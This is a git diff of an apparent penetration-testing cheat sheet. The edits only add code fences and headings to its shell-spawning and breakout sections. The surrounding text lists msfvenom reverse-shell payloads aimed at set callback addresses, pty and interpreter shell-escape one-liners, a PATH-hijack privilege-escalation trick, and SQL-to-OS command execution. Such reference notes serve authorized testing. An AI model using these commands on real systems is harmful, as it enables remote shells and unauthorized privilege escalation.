@@ -782,12 +782,16 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme
 ``` /usr/share/wfuzz/wordlist```
 
 #### Shell Spawning
+```
 which python; which python3
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 Ctrl+Z
 stty raw -echo
 fg+ENTER
-Shell Breakout
+```
+
+#### Shell Breakout
+```
 python -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/sh -i
@@ -795,6 +799,7 @@ perl —e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
+```
 
 #### SUID Privileged Binaries
 ```
@@ -822,7 +827,6 @@ export PATH=/tmp:$PATH
 #### Another trick is to create a reverse shell with msfvenom and place that in the set PATH
 (msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.223 LPORT=555 -f elf -o shell)
 Execute OS Commands from within SQL
-
 
 #### SQL:
 \! whoami
